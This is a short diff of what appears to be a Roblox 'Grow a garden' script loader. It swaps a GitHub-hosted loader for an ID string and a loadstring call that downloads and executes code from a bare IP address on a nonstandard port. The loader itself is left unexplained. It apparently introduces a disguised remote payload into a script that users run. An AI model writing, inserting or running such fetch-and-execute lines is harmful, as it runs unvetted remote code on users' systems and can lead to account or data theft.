@@ -1,3 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/namnnni2/Grow-a-garden/refs/heads/main/My"))()
+ID="abcceb11-4d2e-4607-9127-1099260a3e50"
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/namnnni2/Grow-a-garden/refs/heads/main/Seedopen"))()
